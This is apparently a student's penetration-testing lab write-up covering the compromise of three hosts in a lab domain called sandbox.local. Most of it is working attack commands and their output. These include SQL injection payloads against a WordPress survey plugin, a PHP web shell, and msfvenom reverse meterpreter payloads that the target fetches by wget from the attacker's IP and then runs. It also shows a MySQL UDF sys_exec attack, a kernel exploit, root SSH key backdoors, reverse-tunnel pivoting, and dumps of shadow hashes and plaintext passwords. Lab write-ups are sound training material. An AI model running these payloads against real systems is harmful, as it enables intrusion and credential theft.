## Assembling the Pieces

### ajla/sandbox.local (10.4.4.10/NAT 10.11.1.250)

#### Foothold

Client wants us to check out sandbox.local, they are worried about domain admin creds being compromised.

1. Scanned sandbox.local using default scripts, SYN scan, all ports

   ```bash
   sudo nmap -sC -sS -p- sandbox.local
   ```

   - Found ports 80 & 22 open
   - Possibly using WordPress 5.3

2. Browsed http://sandbox.local/ to see basic webpage

   - Need to look into plugins for page as well as WP version

3. Did basic directory bruteforce to confirm Wordpress and find any files

   ```bash
   dirb http://sandbox.local
   ```
   
   - Confirmed it is WordPress based on folders found
   
4. Use wpscan to scan for vulnerabilities

   ```bash
   wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o sandbox-wpscan cli-no-color
   ```

   - Found 3 plugins
     - elementor
     - ocean-extra
     - wp-survey-and-poll 1.5.7.3

#### SQL Injection on sandbox.local

1. Used searchsploit to find an exploit for wp-survey-and-poll 1.5.7.3

   - https://www.exploit-db.com/exploits/45411
   - Used exploit PoC to find MariaDB version is 10.3.20

2. Enumerated table names with exploit & found table wp_users

   ```sql
   ["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,table_name,11 from information_schema.tables#"];
   ```

3. Enumerated wp_users columns

   ```sql
   ["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,column_name,11 from information_schema.columns where table_name='wp_users'#"];
   ```

   Received column headers for wp_users

4. Enumerated wp_users table & found one user

   ```sql
   ["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,user_login,11 from wp_users#"];
   -- and so on for other fields
   ```

   - user_login: wp_ajla_admin
   - user_pass: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\\\\/
     - Note the 3 backslashes are escaping the final forwardslash
   - user_email: admin@sandbox.local
   
5. Used John the Ripper to crack the password

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt pass_wp_ajla_admin
   ```

   ![image-20200803183212288](.Lesson%2024%20Notes.assets/image-20200803183212288.png)

   Username: wp_ajla_admin
   
   Password:  !love29jan2006!

#### Shell Access

1. Logged into http://sandbox.local/wp-login.php using the creds above & enumerated system.

   - Database server
     - Server version	10.3.20-MariaDB
       Database host	10.5.5.11
   - Webserver 
     - Server architecture	Linux 4.4.0-21-generic x86_64
       Web server	Apache/2.4.18 (Ubuntu)
       PHP version	7.0.33-0ubuntu0.16.04.7 (Supports 64bit values)

2. Uploaded plug-shell.php command shell to Wordpress plugs & accessed it at http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=

3. Generated Metasploit payload, uploaded it to the webserver & made it executable

   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=443 -f elf -o met_rev_http_8001.elf
   
   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.216/met.elf
   
   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2Bx%20met.elf
   ```

4. Started meterpreter session on Kali and executed payload on target

   ```bash
   sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.119.216; set LPORT 443; run"
   
   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./met.elf
   ```


#### Post-Exploitation

Enumerated target

```bash
# /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:112::/var/run/dbus:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
libvirt-qemu:x:111:111:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:112:116:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
ajla:x:1000:1000:service,,,:/home/ajla:/bin/bash
```

ifconfig

```bash
Interface  3
============
Name         : ens160
Hardware MAC : 00:50:56:9f:e6:f6
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 10.4.4.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::250:56ff:fe9f:e6f6
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Routes

```bash
IPv4 network routes
===================

    Subnet    Netmask        Gateway     Metric  Interface
    ------    -------        -------     ------  ---------
    0.0.0.0   0.0.0.0        10.4.4.1    0       ens160
    10.4.4.0  255.255.255.0  0.0.0.0     0       ens160
    10.5.5.0  255.255.255.0  10.4.4.250  0       ens160
```

​	The gateway to 10.5.5.0/24 is 10.4.4.250

Sysinfo

```bash
meterpreter > sysinfo
Computer     : 10.4.4.10
OS           : Ubuntu 16.04 (Linux 4.4.0-21-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ ajla (uid=33, gid=33, euid=33, egid=33)
```

Enumerated /var/www/html/wp-config.php to get DB password:

```bash
/** MySQL database username */                  
define( 'DB_USER', 'wp' );     
                                                          
/** MySQL database password */
define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );

/** MySQL hostname */
define( 'DB_HOST', '10.5.5.11' );
```

#### Pivoting (Old way)

Created a pivot point by establishing a reverse remote shell from the host ajla to Kali.  We created two port forwards for ports 22 and 3306 on the DB server using ajla as the pivot point with the ports 1122 and 13306 on Kali pointing to the ports on the DB server.

1. I first created a key on ajla to use as the authentication mechanism

   ```bash
   mkdir /tmp/keys
   ssh-keygen
   	/tmp/keys/id_rsa_coyote
   cat /tmp/keys/id_rsa_coyote.pub
   ```

2. Added this public key to my trusted keys on Kali in `~/.ssh/authorized_keys` with restrictions only allow the NAT'ed IP of ajla as well as only allow forwarding.

   ```bash
   from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkuK7GzKRtsaPYDPMAyCyVSZkKc0pVG8yBAiQN9pnHYUbiqdHdp4j2wDbvnpThTZQ3R5A4xstAU12m9W8EYmp4wg+22re77vQxrX2+z3dpi0HiMBaUF/5vYVPgL2uWxkJ8kpT5VuhnN7KvQLISeb1nVoH3eiqO5SX+oPqyeSvz9CetaFP510T3D8tYYJK+MZJLEazQ63OGbzxitLVwYxPnzpw9AfDfg/GozttEfjZ93yHESjqkK0iAk9DcSnjC9wF63U/sBH4v0n/0aqdghBxpvRuh/vWABKluAC78accKecMJW8jlMTDpoGHGZzmHw9TqoXuO42+d7zpLczNzM0uZ www-data@ajla
   ```

3. Initiated the SSH connection to Kali to provide a direct path to DB server

   ```bash
   ssh -f -N -R 192.168.119.216:1122:10.5.5.11:22 -R 192.168.119.216:13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa_coyote coyote@192.168.119.216
   ```

#### Privilege Escalation

1. Used EDB # 45010, compiled on Kali & Uploaded to Ajla & ran it to get root

   ```bash
   # From Kali
   searchsploit -m 45010 
   gcc 45010.c -o coyotesploit
   
   # From meterpreter to Ajla
   upload coyotesploit /tmp
   shell
   chmod +x /tmp/coyotesploit
   /tmp/coyotesploit
   ```

2. Added Kali's certificate to Ajla's root user's trusted keys for SSH RSA based authentication

   ```bash
   # Kali
   ssh-keygen
   cat ~/.ssh/id_rsa.pub
   
   # On Meterperter to Ajla
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2wBcNSWi0i+FG5lTNrPs/tXXhzTsjAW94bM4pCrg8BDT+01yVoaDCOvbm4v/RiKjS/nsQEBdQM8StM6tyFrQlwgn7K/rvFQIE6/gJiggcc/knH4NNqlJdUiVUTndv8x+sdh9RjNxpNH/8V4K19MCliFNPSEONyn5dv3926W5Calu5v7kNnuceAACEuKeo4Ose+07WvQZiUtcaeQFTpaXQPH4uJQ2NqdoSxFDJbBECdQpxUhDH1AJcUszHIphsr+WqnWQahDKa/jidqXjG7f98H0g5H41e+yqOQAUIHelcTg+2sUfvSgQgoJCinp0W0Vgt4n0tWgyrFXieb9gtibyfDaJLz4fPvyTWr2ZjKee/JNLKVw30uxskxVlvBarr8+z10CZfi531DFvVU+g6rwhqnLeojKofRdJIFxCgCLR4t0I4yXy1SKfsVZebYAAXAwcY35zPFprZnsqY379yn9emf1Vbu9+mEjLY7on745LwAyF6FSe8/TD8L3QiqIfN11k= coyote@kali" >> /root/.ssh/authorized_keys
   ```

3. Logged in as root via SSH

   ```bash
   ssh root@sandbox.local
   ```

#### More Post-Exploitation

1. Enumerated /etc/group

   ```bash
   root:x:0:     
   daemon:x:1:
   bin:x:2:         
   sys:x:3:    
   adm:x:4:syslog,ajla
   tty:x:5:  
   disk:x:6:          
   lp:x:7:           
   mail:x:8:            
   news:x:9:   
   uucp:x:10:
   man:x:12:
   proxy:x:13:
   kmem:x:15:
   dialout:x:20:
   fax:x:21:
   voice:x:22:
   cdrom:x:24:ajla
   floppy:x:25:
   tape:x:26:
   sudo:x:27:ajla
   audio:x:29:
   dip:x:30:ajla
   www-data:x:33:
   backup:x:34:
   operator:x:37:
   list:x:38:
   irc:x:39:
   src:x:40:
   gnats:x:41:
   shadow:x:42:
   utmp:x:43:
   video:x:44:
   sasl:x:45:
   plugdev:x:46:ajla
   staff:x:50:
   games:x:60:
   users:x:100:
   nogroup:x:65534:
   systemd-journal:x:101:
   systemd-timesync:x:102:
   systemd-network:x:103:
   systemd-resolve:x:104:
   systemd-bus-proxy:x:105:
   input:x:106:
   crontab:x:107:
   syslog:x:108:
   netdev:x:109:
   lxd:x:110:ajla
   kvm:x:111:
   messagebus:x:112:
   uuidd:x:113:
   mlocate:x:114:
   ssh:x:115:
   libvirtd:x:116:ajla
   lpadmin:x:117:ajla
   sambashare:x:118:ajla
   ajla:x:1000:
   ssl-cert:x:119:
   ```

3. Enumerated /etc/shadow

   ```bash
   crontab:x:107:
   syslog:x:108:
   netdev:x:109:
   lxd:x:110:ajla
   kvm:x:111:
   messagebus:x:112:
   uuidd:x:113:
   mlocate:x:114:
   ssh:x:115:
   libvirtd:x:116:ajla
   lpadmin:x:117:ajla
   sambashare:x:118:ajla
   ajla:x:1000:
   ssl-cert:x:119:
   root@ajla:~# cat /etc/shadow
   root:$6$L.DEQk09$DhGD609Wq5aZf0GQPMZYOqiIxxyUwvVBnahArgD.yoVgoxeQeNn3R.JbL0HcmsU1lT1oCrciYlGkfatyobKJH0:18249:0:99999:7:::
   daemon:*:16911:0:99999:7:::
   bin:*:16911:0:99999:7:::
   sys:*:16911:0:99999:7:::
   sync:*:16911:0:99999:7:::
   games:*:16911:0:99999:7:::
   man:*:16911:0:99999:7:::
   lp:*:16911:0:99999:7:::
   mail:*:16911:0:99999:7:::
   news:*:16911:0:99999:7:::
   uucp:*:16911:0:99999:7:::
   proxy:*:16911:0:99999:7:::
   www-data:*:16911:0:99999:7:::
   backup:*:16911:0:99999:7:::
   list:*:16911:0:99999:7:::
   irc:*:16911:0:99999:7:::
   gnats:*:16911:0:99999:7:::
   nobody:*:16911:0:99999:7:::
   systemd-timesync:*:16911:0:99999:7:::
   systemd-network:*:16911:0:99999:7:::
   systemd-resolve:*:16911:0:99999:7:::
   systemd-bus-proxy:*:16911:0:99999:7:::
   syslog:*:16911:0:99999:7:::
   _apt:*:16911:0:99999:7:::
   lxd:*:18184:0:99999:7:::
   messagebus:*:18184:0:99999:7:::
   uuidd:*:18184:0:99999:7:::
   dnsmasq:*:18184:0:99999:7:::
   sshd:*:18184:0:99999:7:::
   libvirt-qemu:!:18184:0:99999:7:::
   libvirt-dnsmasq:!:18184:0:99999:7:::
   ajla:$6$OLfdLDQT$7Q2mzNaQEudRSaHZck3P165EI3OVlgdCwPXrUyiNmItYb7fc/z5RvPc.4VeMgsGMq1H7Wl3HH/dUP2ELRjc2t1:18184:0:99999:7:::
   ```

4. Searched for any passwords in the system:

   ```bash
   grep password auth.log
   # Dec 10 16:24:54 ajla sudo:     root : TTY=pts/0 ; PWD=/var/www/html ; USER=www-data ; COMMAND=/tmp/bootstrap/wp-cli.phar core install --path=/var/www/html/ --url=http://sandbox.local --title=sandbox --admin_user=wp_ajla_admin --admin_password=!love29jan2006! --admin_email=admin@sandbox.local
   ls /root/.bash_history
   # mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'
   ```

   Found DB root password:  `BmDu9xUHKe3fZi3Z7RdMBeb`

### Zora - DB Server (10.5.5.11)

#### Foothold

1. Logged into MariaDB through Kali pivot using creds from ajla

   ```bash
   mysql -u root -p -h 127.0.0.1 -P 13306
   ```

2. Enumerated the DB to find hostname and plugin_dir

   ```bash
   select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir
   
   +------------+----------+-----------------+---------------------------+-------------------+
   | @@hostname | @@tmpdir | @@version       | @@version_compile_machine | @@plugin_dir      |
   +------------+----------+-----------------+---------------------------+-------------------+
   | zora       | /var/tmp | 10.3.20-MariaDB | x86_64                    | /home/dev/plugin/ |
   +------------+----------+-----------------+---------------------------+-------------------+
   ```


#### Exploitation

Used a UDF attack against the database

1. Cloned shellcode from https://github.com/mysqludf/lib_mysqludf_sys.git

   ```bash
   git clone https://github.com/mysqludf/lib_mysqludf_sys.git
   ```

2. Modified makefile for mariaDB

   ```bash
   gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
   ```
   
3. Compiled binary and dumped to plain hex format to use in shellcode

   ```bash
   make
   xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_s
   ys.so.hex
   ```

4. Started meterpreter handler on Kali

   ```bash
   sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.119.216; set LPORT 443; run"
   ```
   
5. Ran the following commands

   ```sql
   set @shellcode = 0x7f454c4602010100000000<SNIPPED>00000
   select @@plugin_dir;
   select binary @shellcode into dumpfile '/home/dev/plugin/udf_sys_exec.so';
   create function sys_exec returns int soname 'udf_sys_exec.so';
   # Verified function creation
   select * from mysql.func where name='sys_exec';
   # Uploaded meterpreter reverse shell exploit
   select sys_exec('wget http://192.168.119.216/met_rev_tcp_443.elf');
   # Made code executable
   select sys_exec('chmod +x met_rev_tcp_443.elf');
   # Ran code to get meterpreter prompt to Zora
   select sys_exec('./met_rev_tcp_443.elf');
   ```

#### Enumeration

1. OS Info

   ```bash
   cat /etc/*-release
   3.10.2
   NAME="Alpine Linux"
   ID=alpine
   VERSION_ID=3.10.2
   PRETTY_NAME="Alpine Linux v3.10"
   HOME_URL="https://alpinelinux.org/"
   BUG_REPORT_URL="https://bugs.alpinelinux.org/"
   
   cat /proc/version
   Linux version 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019
   ```
   
2. Environment variables

   ```bash
   env
   USER=mysql
   SHLVL=1
   HOME=/var/lib/mysql
   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
   LANG=C
   PWD=/var/lib/mysql
   ```

3. Running Procs

   ```bash
   ps aux
    1153 root      0:00 [irq/46-pciehp]
    1156 root      0:00 [irq/47-pciehp]
    1159 root      0:00 [irq/48-pciehp]
    1162 root      0:00 [irq/49-pciehp]
    1165 root      0:00 [irq/50-pciehp]
    1168 root      0:00 [irq/51-pciehp]
    1171 root      0:00 [irq/52-pciehp]
    1174 root      0:00 [irq/53-pciehp]
    1177 root      0:00 [irq/54-pciehp]
    1180 root      0:00 [irq/55-pciehp]
    1201 root      0:00 [scsi_eh_0]
    1202 root      0:00 [scsi_tmf_0]
    1203 root      0:00 [vmw_pvscsi_wq_0]
    1204 root      0:00 [scsi_eh_1]
    1223 root      0:00 [scsi_tmf_1]
    1226 root      0:00 [scsi_eh_2]
    1227 root      0:00 [scsi_tmf_2]
    1231 root      0:00 [kworker/0:2-eve]
    2205 root      0:00 [jbd2/sda3-8]
    2206 root      0:00 [ext4-rsv-conver]
    2602 root      0:00 [ttm_swap]
    2603 root      0:00 [irq/16-vmwgfx]
    2689 root      0:00 [ipv6_addrconf]
    2763 root      0:00 [kworker/0:1H-kb]
    2848 root      0:00 [jbd2/sda1-8]
    2849 root      0:00 [ext4-rsv-conver]
    3105 root      0:00 [cifsiod]
    3106 root      0:00 [cifsoplockd]
    3139 root      0:00 /sbin/syslogd -t
    3193 root      0:00 /sbin/acpid
    3218 root      0:13 /usr/bin/vmtoolsd
    3247 chrony    0:00 /usr/sbin/chronyd -f /etc/chrony/chrony.conf
    3309 root      0:00 /usr/sbin/crond -c /etc/crontabs
    3415 mysql     0:06 /usr/bin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/home/dev/plugin --user=mysql --pid-file=/run/mysqld/mariadb.pid
    3416 root      0:00 logger -t mysqld -p daemon.error
    3486 root      0:00 /sbin/getty 38400 tty1
    3487 root      0:00 /sbin/getty 38400 tty2
    3491 root      0:00 /sbin/getty 38400 tty3
    3495 root      0:00 /sbin/getty 38400 tty4
    3499 root      0:00 /sbin/getty 38400 tty5
    3503 root      0:00 /sbin/getty 38400 tty6
    3508 root      0:00 /usr/sbin/sshd
    3678 root      0:00 [kworker/u2:1-fl]
    6235 mysql     0:00 ./met_rev_tcp_443.elf
    6949 root      0:00 [cifsd]
    6974 mysql     0:00 /bin/sh
    7010 root      0:00 /sbin/getty -L 0 ttyS0 vt100
    7011 mysql     0:00 ps aux
   ```

4. Netstat

   ```bash
   netstat -tulpn 
   netstat: showing only processes with your user ID
   Active Internet connections (only servers)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
   tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
   tcp        0      0 :::22                   :::*                    LISTEN      -
   udp        0      0 127.0.0.1:323           0.0.0.0:*                           -
   udp        0      0 ::1:323                 :::*                                -
   ```

5. Enumerated /etc/passwd

   ```bash
   root:x:0:0:root:/root:/bin/ash
   bin:x:1:1:bin:/bin:/sbin/nologin
   daemon:x:2:2:daemon:/sbin:/sbin/nologin
   adm:x:3:4:adm:/var/adm:/sbin/nologin
   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
   sync:x:5:0:sync:/sbin:/bin/sync
   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
   halt:x:7:0:halt:/sbin:/sbin/halt
   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
   news:x:9:13:news:/usr/lib/news:/sbin/nologin
   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
   operator:x:11:0:operator:/root:/sbin/nologin
   man:x:13:15:man:/usr/man:/sbin/nologin
   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
   ftp:x:21:21::/var/lib/ftp:/sbin/nologin
   sshd:x:22:22:sshd:/dev/null:/sbin/nologin
   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
   games:x:35:35:games:/usr/games:/sbin/nologin
   postgres:x:70:70::/var/lib/postgresql:/bin/sh
   cyrus:x:85:12::/usr/cyrus:/sbin/nologin
   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
   ntp:x:123:123:NTP:/var/empty:/sbin/nologin
   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
   guest:x:405:100:guest:/dev/null:/sbin/nologin
   nobody:x:65534:65534:nobody:/:/sbin/nologin
   chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
   mysql:x:101:102:mysql:/var/lib/mysql:/sbin/nologin
   dev:x:1000:1000:Linux User,,,:/home/dev:/bin/ash
   ```

6. Files systems

   ```bash
   cat /etc/fstab         
   UUID=ede2f74e-f23a-441c-b9cb-156494837ef3       /       ext4    rw,relatime 0 1
   UUID=8e53ca17-9437-4f54-953c-0093ce5066f2       /boot   ext4    rw,relatime 0 2
   UUID=ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046       swap    swap    defaults        0 0
   /dev/cdrom      /media/cdrom    iso9660 noauto,ro 0 0                                                              
   /dev/usbdisk    /media/usb      vfat    noauto  0 0      
   //10.5.5.20/Scripts    /mnt/scripts    cifs    uid=0,gid=0,username=,password=,_netdev 0 0     
   ```

   Discovered:  10.5.5.20 has shares

7. Checked out network mount to find some scripts:

   ```bash
   cd /mnt/scripts
   ls
   nas_setup.yml
   olduserlookup.ps1
   system_report.ps1
   temp_folder_cleanup.bat    
   ```

8. Found creds for 'Poultry' in system_report.ps1

   ```powershell
   # find a better way to automate this
   $username = "sandbox\alex"
   $pwdTxt = "Ndawc*nRoqkC+haZ"
   $securePwd = $pwdTxt | ConvertTo-SecureString 
   $credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd
   
   # Enable remote management on Poultry
   $remoteKeyParams = @{
   ComputerName = "POULTRY"
   Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'
   Name = 'EnableRemoteManagement'
   Value = '1' 
   }
   Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
   
   # Strange calc processes running lately
   Stop-Process -processname calc
   
   # Check for failed services
   Get-Service | Where-Object {$_.status -eq "stopped"}
   
   # Cleanup
   Clear-History
   ```

   Hostname: Poultry
   Username: sandbox\alex
   Password: Ndawc*nRoqkC+haZ

9. Set up a Dynamic SSH tunnel through Zora & set Kali to use port 1080 for SOCKS proxy connections.

   ```bash
   # On Zora
   mkdir /tmp/keys
   ssh-keygen
   	/tmp/keys/id_rsa_coyote
   cat /tmp/keys/id_rsa_coyote.pub
   
   # Added keys to ~/.ssh/authorized_keys on Kali
   from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt8oHfBk89epFmFRycp8P3WHOo6NPF2/Af8JzouKvYUkrU/71+AEm/NM52xhhtvA+zNXOtHskQfO4wUjVlw2AkK14W5pPrqgof5/St5b1rWHl1cwYz9QHb0jX7sqyavvGYuS/XADZK5lsdEbuA26xeuoKYxKLkMpyZjf5wBFrEUZxta4knLeHVP1DCMRaYHPVLTzZfupbxLVXUkbMlTbqbq/OvJqX0+OiZeFtNKjGu7z+n4sj6Epg4dqBw9exK8f3LYt9qJwgs3U1AQulqQsA1VLRkFO+3xyj9kmQqSouXwC3qj4rBWj4n+WhXz/RbSGGy4RMX5bUtMY5OADH3rTI4Zv96sgFKP09bpLWkhBHr4ou/CwHu7SIqQi/S9Pf8OdfrpkUi0fl8qXQU8oPZZ+aACvL0DbW5+52/gxaTYfgErUpbs+4LHfSXSABYyTbzDir1DyE0rjAgwGfGREOBC+v8MBW9o19R++KkVt5b0iJUg2tvkRmGV3MlbT9fQNnGWSc= mysql@zora
   ```
   
   ```bash
   # Initiated connection from Zora
   ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa_coyote coyote@192.168.119.216
   ```
   
   

### Poultry (10.5.5.20)

#### Enumeration

1. Did an initial scan to verify this is a Windows client

   ```bash
   proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20 --open
   
   PORT     STATE SERVICE
   135/tcp  open  msrpc
   139/tcp  open  netbios-ssn
   445/tcp  open  microsoft-ds
   3389/tcp open  ms-wbt-server 
   ```

#### Exploitation

1. Logged into the target via RDP

   ```bash
   proxychains rdesktop 10.5.5.20 -d sandbox -u alex -p -
   ```

#### Post-Exploitation Enumeration

1. systeminfo

   ```powershell
   C:\Users\alex>systeminfo
   
   Host Name:                 POULTRY
   OS Name:                   Microsoft Windows 7 Professional
   OS Version:                6.1.7601 Service Pack 1 Build 7601
   OS Manufacturer:           Microsoft Corporation
   OS Configuration:          Member Workstation
   OS Build Type:             Multiprocessor Free
   Registered Owner:          poultryadmin
   Registered Organization:
   Product ID:                00371-868-0000007-85044
   Original Install Date:     1/9/2020, 5:22:00 PM
   System Boot Time:          7/21/2020, 4:36:22 AM
   System Manufacturer:       VMware, Inc.
   System Model:              VMware Virtual Platform
   System Type:               x64-based PC
   Processor(s):              1 Processor(s) Installed.
                              [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD
    ~3094 Mhz
   BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
   Windows Directory:         C:\Windows
   System Directory:          C:\Windows\system32
   Boot Device:               \Device\HarddiskVolume1
   System Locale:             en-us;English (United States)
   Input Locale:              en-us;English (United States)
   Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
   Total Physical Memory:     4,095 MB
   Available Physical Memory: 2,395 MB
   Virtual Memory: Max Size:  8,189 MB
   Virtual Memory: Available: 6,679 MB
   Virtual Memory: In Use:    1,510 MB
   Page File Location(s):     C:\pagefile.sys
   Domain:                    sandbox.local
   Logon Server:              \\SANDBOXDC
   Hotfix(s):                 N/A
   Network Card(s):           1 NIC(s) Installed.
                              [01]: Intel(R) 82574L Gigabit Network Connection
                                    Connection Name: Ethernet0
                                    DHCP Enabled:    No
                                    IP address(es)
                                    [01]: 10.5.5.20
   
   ```

2. Network Ports

   ```powershell
   C:\Users\alex>netstat -ano
   
   Active Connections
   
     Proto  Local Address          Foreign Address        State           PID
     TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       812
     TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
     TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       416
     TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       524
     TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       864
     TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       352
     TCP    0.0.0.0:49164          0.0.0.0:0              LISTENING       624
     TCP    0.0.0.0:49165          0.0.0.0:0              LISTENING       2640
     TCP    0.0.0.0:49171          0.0.0.0:0              LISTENING       632
     TCP    10.5.5.20:139          0.0.0.0:0              LISTENING       4
     TCP    10.5.5.20:445          10.5.5.11:45824        ESTABLISHED     4
     TCP    10.5.5.20:3389         10.5.5.11:59234        ESTABLISHED     416
     TCP    [::]:135               [::]:0                 LISTENING       812
     TCP    [::]:445               [::]:0                 LISTENING       4
     TCP    [::]:3389              [::]:0                 LISTENING       416
     TCP    [::]:49152             [::]:0                 LISTENING       524
     TCP    [::]:49153             [::]:0                 LISTENING       864
     TCP    [::]:49154             [::]:0                 LISTENING       352
     TCP    [::]:49164             [::]:0                 LISTENING       624
     TCP    [::]:49165             [::]:0                 LISTENING       2640
     TCP    [::]:49171             [::]:0                 LISTENING       632
     UDP    0.0.0.0:123            *:*                                    276
     UDP    0.0.0.0:500            *:*                                    352
     UDP    0.0.0.0:4500           *:*                                    352
     UDP    0.0.0.0:5355           *:*                                    416
     UDP    10.5.5.20:137          *:*                                    4
     UDP    10.5.5.20:138          *:*                                    4
     UDP    127.0.0.1:49953        *:*                                    352
     UDP    127.0.0.1:56529        *:*                                    632
     UDP    127.0.0.1:56532        *:*                                    416
     UDP    [::]:123               *:*                                    276
     UDP    [::]:500               *:*                                    352
     UDP    [::]:4500              *:*                                    352
   ```

3. Checking `alex` user:

   ```powershell
   C:\Users\alex>net user /domain alex
   The request will be processed at a domain controller for domain sandbox.local.
   
   User name                    Alex
   Full Name                    Alex
   Comment
   User's comment
   Country code                 000 (System Default)
   Account active               Yes
   Account expires              Never
   
   Password last set            1/9/2020 4:09:44 PM
   Password expires             Never
   Password changeable          1/10/2020 4:09:44 PM
   Password required            Yes
   User may change password     Yes
   
   Workstations allowed         All
   Logon script
   User profile
   Home directory
   Last logon                   8/18/2020 2:52:33 PM
   
   Logon hours allowed          All
   
   Local Group Memberships
